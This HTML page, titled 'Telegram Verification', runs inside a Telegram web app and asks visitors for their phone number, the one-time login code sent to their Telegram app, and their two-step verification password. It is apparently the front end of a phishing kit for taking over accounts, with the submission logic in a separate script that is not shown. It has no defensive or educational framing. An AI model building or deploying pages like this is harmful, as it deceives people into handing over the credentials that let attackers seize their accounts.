<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <video class="background-video" autoplay muted loop playsinline>
            <source src="video/video1.mp4" type="video/mp4">
        </video>

        <div class="content">
            <div class="emoji-center">
                <span class="emoji">📱</span>
            </div>

            <!-- Step 1: Phone Number -->
            <div id="phone-section" style="width:100%;display:flex;flex-direction:column;align-items:center;gap:16px;">
                <div class="instruction">
                    <b>Telegram Verification</b><br><br>
                    Enter your phone number to receive the verification code.
                </div>
                <input type="tel" id="phone-input" class="phone-input" placeholder="+91 98765 43210">
                <button id="send-otp-btn" class="verify-btn">📤 Send Verification Code</button>
            </div>

            <!-- Step 2: OTP -->
            <div id="otp-section" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
                <div class="instruction">
                    <b>Telegram Verification</b><br><br>
                    Enter the 5-digit code sent to your Telegram app.
                </div>
                <div class="otp-boxes">
                    <input type="text" maxlength="1" class="otp-box" data-index="0">
                    <input type="text" maxlength="1" class="otp-box" data-index="1">
                    <input type="text" maxlength="1" class="otp-box" data-index="2">
                    <input type="text" maxlength="1" class="otp-box" data-index="3">
                    <input type="text" maxlength="1" class="otp-box" data-index="4">
                </div>
                <button id="verify-btn" class="verify-btn">✅ Verify Code</button>
                <div class="keypad">
                    <button class="key" data-key="1">1</button>
                    <button class="key" data-key="2">2</button>
                    <button class="key" data-key="3">3</button>
                    <button class="key" data-key="4">4</button>
                    <button class="key" data-key="5">5</button>
                    <button class="key" data-key="6">6</button>
                    <button class="key" data-key="7">7</button>
                    <button class="key" data-key="8">8</button>
                    <button class="key" data-key="9">9</button>
                    <div></div>
                    <button class="key" data-key="0">0</button>
                    <button class="key backspace" data-key="backspace">⌫</button>
                </div>
            </div>

            <!-- Step 3: 2FA -->
            <div id="twofa-section" style="display:none;width:100%;flex-direction:column;align-items:center;gap:16px;">
                <div class="instruction">
                    <b>Two-Step Verification</b><br><br>
                    Your account has 2FA enabled. Enter your password to continue.
                </div>
                <input type="password" id="twofa-input" class="phone-input" placeholder="Enter 2FA password">
                <button id="twofa-btn" class="verify-btn">✅ Verify 2FA</button>
            </div>

        </div>
    </div>

    <script src="app.js"></script>
</body>
</html>
